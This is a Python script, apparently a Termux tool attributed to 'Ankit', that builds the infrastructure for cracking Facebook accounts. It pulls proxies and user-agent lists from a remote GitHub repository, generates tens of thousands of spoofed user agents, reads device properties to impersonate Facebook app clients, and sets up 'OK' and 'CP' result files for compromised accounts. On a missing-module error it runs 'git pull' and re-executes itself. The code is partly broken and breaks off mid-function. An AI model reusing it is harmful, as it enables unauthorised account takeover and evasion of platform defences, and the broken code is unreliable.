#------------[ FILE X RANDOM ]--------------#
#------------[ ORIGINAL WRITTTEN BY ANKIT]--------------#
#------------[ ANKIT BHATTARAI ]--------------#
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
	import os,platform,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import requests,bs4,json,os,sys,random,datetime,time,re,multiprocessing,socket
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
	from time import localtime as lt
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('git pull')
	#os.system("pkg install espeak")
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python main.py')	
#print('[•] Join Whatsap Group')
#os.system('xdg-open https://chat.whatsapp.com/BtSbBAkabek4fBAMcCUK6U')
try:
	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
	open('proxies.txt','w').write(proxies)
except Exception as e:
	#print('\x1b[1;95m[√] LOADING...')
	#os.system("espeak -a 300 \"Checking,Update,\"")
	os.system('clear')
	print('\033[1;31m[√] LOADING ')
	print('')
	
 
#NbrX =input('\x1b[38;5;46m [•] \x1b[38;5;46mWHAT IS YOUR NBR : ')	
proxies=open('proxies.txt','r').read().splitlines()


android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
	for line in xx:
		android_models.append(line)
except:pass

usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass

gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=f' en-us; {str(gt)}'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)
rug=[]
for nt in range(10000):
	rr=random.randint
	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	rx=random.randrange(1, 999)
	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
	rug.append(xx)
ruz=[]
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	ruz.append(xd)
	
#new ua
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)	

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}



cellphone = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']

def clr():
    try:
        data = os.listdir('/sdcard')
        if 'Android' in data:
            print(' \033[1;32m[!]\033[1;37m D'+'ont Try Bypas'+'s Mother Fuc'+'ker...! \n YOUR'+' BYPAS'+'S FUCK'+'ED BY ANKIT');exit()
        else:exit()
    except:exit()        
        
#------------[ WARNA-COLOR ]--------------#

BLUE = '\x1b[38;5;196m'
WHITE = '\x1b[37m'
P = '\x1b[1;97m'
M = '\x1b[38;5;196m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[38;5;196m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
###----------[ ANSII COLOR STYLE ]---------- ###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

###----------[ RICH COLOR STYLE ]---------- ###
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu  
###----------[ NEW ANSII COLOR STYLE ]---------- ###
COLOR_BLACK="\033[0;30m"
COLOR_RED="\033[0;31m"
COLOR_GREEN="\033[0;32m"
COLOR_BROWN="\033[0;33m"
COLOR_BLUE="\033[0;34m"
COLOR_PURPLE="\033[0;35m"
COLOR_CYAN="\033[0;36m"
COLOR_LIGHT_GRAY="\033[0;37m"
COLOR_DARK_GRAY="\033[1;30m"
COLOR_LIGHT_RED="\033[1;31m"
COLOR_LIGHT_GREEN="\033[1;32m"
COLOR_YELLOW="\033[1;33m"
COLOR_LIGHT_BLUE="\033[1;34m"
COLOR_LIGHT_PURPLE="\033[1;35m"
COLOR_LIGHT_CYAN="\033[1;36m"
COLOR_LIGHT_WHITE="\033[1;37m"
COLOR_BOLD="\033[1m"
COLOR_FAINT="\033[2m"
COLOR_ITALIC="\033[3m"
COLOR_UNDERLINE="\033[4m"
COLOR_BLINK="\033[5m"
COLOR_NEGATIVE="\033[7m"
COLOR_CROSSED="\033[9m"
      
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
dic2 = {'01':'JANUARY','02':'FEBRUARY','03':'MARCH','04':'APRIL','05':'MAY','06':'JUNE','07':'JULY','08':'AUGUST','09':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"  

#------------[ USERAGENT FILE AND RANDOM ]--------------#

#------------[ THIS IS FOR METHOD 1 ]--------------#  
#------------[ THIS IS FOR RANDOM 1 ]--------------#  	     	     
def ONE():
    END = 'Mozilla/5.0 (Linux; Android 10: 10; Linux; Android 10:L5232J AppleWebKit/537.36 (KHTML, like Gecko)82 0 6353 142 Chrome/125.0.6422.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/467.1.0.52.83;]","Mozilla/5.0 (Linux; Android 10: 10; Linux; Android 10:N2978V AppleWebKit/537.36 (KHTML, like Gecko)84 0 6557 91 Chrome/125.0.6422.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/467.1.0.52.83;]","Mozilla/5.0 (Linux; Android 10: 10; Linux; Android 10:Y9233E AppleWebKit/537.36 (KHTML, like Gecko)87 0 6548 106 Chrome/125.0.6422.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/467.1.0.52.83;]'
    ua = 'Mozilla/5.0 (Linux; Android 10: 9; Linux; Android 10:C137K AppleWebKit/537.36 (KHTML, like Gecko)96 0 6612 104 Chrome/125.0.6422.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/467.1.0.52.83;]","Mozilla/5.0 (Linux; Android 10: 9; Linux; Android 10:H6202T AppleWebKit/537.36 (KHTML, like Gecko)83 0 6325 76 Chrome/125.0.6422.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/467.1.0.52.83;]","Mozilla/5.0 (Linux; Android 10: 9; Linux; Android 10:K163O AppleWebKit/537.36 (KHTML, like Gecko)95 0 6222 123 Chrome/125.0.6422.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/467.1.0.52.83;] '+END
    return ua     
#------------[ THIS IS FOR METHOD 2 ]--------------#    
#------------[ THIS IS FOR RANDOM 2 ]--------------#  	        
def FF():
    END = 'Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;P2417V AppleWebKit/537.36 (KHTML, like Gecko)86 0 5763 71 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;D7407B AppleWebKit/537.36 (KHTML, like Gecko)97 0 6439 68 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;H4681H AppleWebKit/537.36 (KHTML, like Gecko)102 0 6095 56 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]'
    ua = 'Mozilla/5.0 (Linux; Android 9; 8; Linux; Android 9;G6987D AppleWebKit/537.36 (KHTML, like Gecko)94 0 5970 89 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 8; Linux; Android 9;Y9485H AppleWebKit/537.36 (KHTML, like Gecko)91 0 6622 99 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 8; Linux; Android 9;T50M AppleWebKit/537.36 (KHTML, like Gecko)95 0 5996 107 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;] '+END   
    return ua
    ua1 = 'Mozilla/5.0 (Linux; Android 9; 10; Linux; Android 9;W7963J AppleWebKit/537.36 (KHTML, like Gecko)93 0 6346 55 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 10; Linux; Android 9;D6421H AppleWebKit/537.36 (KHTML, like Gecko)86 0 6677 117 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 10; Linux; Android 9;A9235Z AppleWebKit/537.36 (KHTML, like Gecko)95 0 6073 85 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;] '+END
    return ua
           
#------------[ THIS IS FOR METHOD 3 ]--------------# 
#------------[ THIS IS FOR RANDOM 3 ]--------------#  	     
def THREE():
    END = 'Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;D2300O AppleWebKit/537.36 (KHTML, like Gecko)83 0 5787 61 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;W4310P AppleWebKit/537.36 (KHTML, like Gecko)92 0 6603 88 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 9; Linux; Android 9;M3483L AppleWebKit/537.36 (KHTML, like Gecko)98 0 6386 115 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]'
    ua = 'Mozilla/5.0 (Linux; Android 9; 5; Linux; Android 9;L7827R AppleWebKit/537.36 (KHTML, like Gecko)97 0 6670 69 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 5; Linux; Android 9;F5230H AppleWebKit/537.36 (KHTML, like Gecko)83 0 6061 69 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 5; Linux; Android 9;Q7891I AppleWebKit/537.36 (KHTML, like Gecko)100 0 6314 118 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;] '+END
    return ua 
    ua1 = 'Mozilla/5.0 (Linux; Android 9; 10; Linux; Android 9;C6756N AppleWebKit/537.36 (KHTML, like Gecko)98 0 6076 74 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 10; Linux; Android 9;Y9818K AppleWebKit/537.36 (KHTML, like Gecko)82 0 6182 124 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;]","Mozilla/5.0 (Linux; Android 9; 10; Linux; Android 9;H9116V AppleWebKit/537.36 (KHTML, like Gecko)97 0 6179 53 Chrome/86.0.4240.198 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/298.0.0.46.116;] '+ua
    return ua1

import random
import os
import argparse
import uuid
from datetime import datetime
import hashlib

# Define the file where the count and date will be stored
count_file = '.tokn'
# Define a file to store a hash for additional verification
hash_file = '.prox'

# Generate a unique hash based on the script content and timestamp
def generate_hash():
    hash_string = f"run_count_file:{count_file}|timestamp:{datetime.now().date()}"
    return hashlib.sha256(hash_string.encode()).hexdigest()

# Check the integrity of the hash
def verify_hash():
    if os.path.exists(hash_file):
        with open(hash_file, 'r') as file:
            stored_hash = file.read().strip()
            current_hash = generate_hash()
            return stored_hash == current_hash
    return False

# Update the hash file
def update_hash():
    with open(hash_file, 'w') as file:
        file.write(generate_hash())

# Function to read and update the run count
def update_run_count(user_name):
    today = datetime.now().date()
    count = 0
    last_run_date = today

    # Check if the count file exists and is valid
    if os.path.exists(count_file) and verify_hash():
        try:
            with open(count_file, 'r') as file:
                data = file.read().strip().split(',')
                if len(data) == 2:
                    last_run_date_str, count_str = data
                    last_run_date = datetime.strptime(last_run_date_str, '%Y-%m-%d').date()
                    count = int(count_str)
        except (ValueError, IndexError) as e:
            print(f"\033[1;31mError reading count file: {e}\033[1;37m")
            count = 0
            last_run_date = today
    else:
        # Initialize files if not present or if the hash is invalid
        print("\033[1;31mCount file or hash is missing/invalid. Initializing...\033[1;37m")
        update_hash()

    # Reset the count if the date has changed
    if last_run_date != today:
        count = 0
        last_run_date = today

    # Increment the count if the user is not 'Ankit'
    if user_name.lower() != 'ankit':
        count += 1

    # Check if the run count exceeds the limit for non-Ankit users
    if user_name.lower() != 'ankit' and count > 10:
        print("\033[1;31mError: Run limit exceeded for today. Try again tomorrow.\033[1;37m")
        exit()

    # Save the updated count and date
    with open(count_file, 'w') as file:
        file.write(f"{last_run_date.strftime('%Y-%m-%d')},{count}")
    
    update_hash()
    return count

# Generate a random color code
def random_color():
